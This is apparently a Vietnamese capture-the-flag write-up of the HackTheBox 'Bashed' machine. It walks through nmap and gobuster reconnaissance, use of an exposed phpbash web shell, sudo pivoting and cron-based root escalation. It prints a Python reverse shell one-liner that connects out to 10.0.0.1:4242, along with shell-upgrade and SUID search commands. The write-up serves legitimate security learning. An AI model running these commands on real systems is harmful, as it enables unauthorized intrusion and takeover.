# Mở đầu
Tiếp theo series là machine Bashed đây cũng được đánh giá là một bài dễ

![](https://images.viblo.asia/04c8dad0-c88f-4939-93a6-f513b31a65ca.PNG)
# Write-up
## Recon
 Vẫn là câu lệnh quen thuộc 
` nmap -A -v 10.10.10.68 -p- -o nmap`

![](https://images.viblo.asia/3e1645e9-3f5a-4c56-b934-ff1d14671c1b.PNG)

Ta thấy server chỉ mở đúng một cổng 80 và ta tiến hành truy cập thử xem có gì 

![](https://images.viblo.asia/f9ec7727-e386-4ca2-a114-95f973f52e20.PNG)

Ở đây nhắc đến phpbash được triển khai trên server này. Sau khi tìm thử thì mình phát hiện đây là một web shell và mình bắt đầu dùng gobuster để tìm đường dẫn đến file này 

`gobuster dir -w /usr/share/wordlists/dirb/common.txt -u 10.10.10.68 -x php,txt,bak -o gobuster`

![](https://images.viblo.asia/5f489c59-6588-4540-aaa4-3af3c56deb51.PNG)

Sau khi vào các thư mục ở trên thì ta thấy 2 file web shell 

![](https://images.viblo.asia/7576fa13-5260-49f1-b0e7-34ecd2c5c0e4.PNG)

## Exploit 
### www-data
Đầu tiên mình kiểm tra server có python không bằng lệnh 
`which python`

Sau khi xác nhận server có python thì mình tạo một reverse shell về máy mình để tiện thao tác
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
Và ta có được shell đầu 
![](https://images.viblo.asia/1f14f194-54a9-4ad5-bdc5-c3a1e4592138.PNG)
### scriptmanager
Kiểm tra user có thể chạy lện nào bằng sudo
`sudo -l `
![](https://images.viblo.asia/1c834c5d-53c2-46ff-8f7e-270ba6e53cae.PNG)
Ở đây ta có thể chạy bất kì lệnh nào dưới quyền của scriptmanager và ta dễ dàng có được shell thứ 2 <br>
`sudo -u scriptmanager /bin/bash`
![](https://images.viblo.asia/6c424fb0-7c22-4245-8c46-c90628533d19.PNG)
### root
Kiểm tra với sudo và find không tìm được file nào thú vị 
```
sudo -l
find / -perm -u=s -exec ls -la {} \; 2>/dev/null
```

![](https://images.viblo.asia/daf220a8-c13a-4e65-aac4-e8a0e212580a.PNG)

Ở đây chắc hẳn nhiều bạn có thói quen ấn Ctrl+C và sau khi ấn ta sẽ bị mất shell (dump shell) và lại phải làm lại từ đầu. Bây giờ mình sẽ hướng dẫn các bạn từ **dump shell** lên **fully interactive ttys**<br>
*Lưu ý:* Nếu bạn dùng bản kail mới nhất hay đang dùng shell khác không phải là bash shell thì phải đổi về bash shell thì mới có thể làm được( Mình tạo một user khác có shell là /bin/bash)
![](https://images.viblo.asia/e23f7cc1-a3c5-4917-a7ec-ecae18b2e3e9.PNG)

Đầu tiên tạo shell tty với python 
`python -c 'import pty;pty.spawn("/bin/bash")`
Tiếp theo ấn Ctrl+Z để cho shell chạy background

![](https://images.viblo.asia/ececd56e-f2ec-4672-b0b2-c147bff3b6be.PNG)
Tìm loại TERM đang chạy shell của mình 
`echo $TERM `
![](https://images.viblo.asia/cd516d61-4927-4a43-9f4f-bb2b1acb2813.PNG)

Ở đây mình dùng tmux lên TERM là screen còn bình thường sẽ là xterm-256color
Tiếp đến là 
```
stty raw -echo 
fg
reset
screen( tùy vào giá trị mà bạn lệnh echo $TERM của bạn)
```
![](https://images.viblo.asia/98bc8af8-9a9c-47e1-8d93-73218ad302ab.PNG)

*Lưu ý:* ở đây mình không đánh lại lệnh nc -lnvp 443

Sau khi hoàn thành bạn sẽ không phải lo việc ấn nhầm Ctrl+C và bị mất shell nữa
![](https://images.viblo.asia/198cb678-a082-4632-bfc5-cea6510bcedf.PNG)

Tiếp tục với leo thang thì sau khi chạy ps thì mình thấy server đang chạy cron
`ps aux | grep root`

![](https://images.viblo.asia/a52c7f3c-c028-4ee4-874a-c6ca24c681b8.PNG)
 
 Liệt kê tất cả file cấu hình cron
 `ls -la /etc/cron*`
 
 ![](https://images.viblo.asia/4e923c1b-b5e3-4ce4-a6d4-f6c5d6aee7c6.PNG)

Mình xem thử qua tất cả các file và không thấy file nào có khả năng để khai thác

Sau đó mình tìm thử các file thuộc sở hữu của scriptmanager
`find / 2>/dev/null -user scriptmanager | grep -v proc`

![](https://images.viblo.asia/bbdbef67-2d0a-483d-abe3-993f6d4e92b1.PNG)

Sau khi đọc thử 2 file ở thư mục scripts thì mình thấy file test .py sẽ ghi vào test.txt và để ý ở đây quyền của test.txt là root cộng với cron thì mình đoán là file test .py được chạy bằng cron. Bây mình sẽ dùng nano để chỉnh sửa file test .py và để làm được điều này thì mình đã trình bày ở trên cách để lên fully interactive shell.

Ghi vào file test .py
![](https://images.viblo.asia/784a2f84-b9d6-40de-937b-90537f0a7332.PNG)

Đợi 1 lúc là ta có được shell root 

![](https://images.viblo.asia/c3effb35-1d3f-42c5-9bef-2bd6ab7d69c5.PNG)

# Conclusion
Ở bài này mình học được cách nâng từ simple shell lên fully interactive shell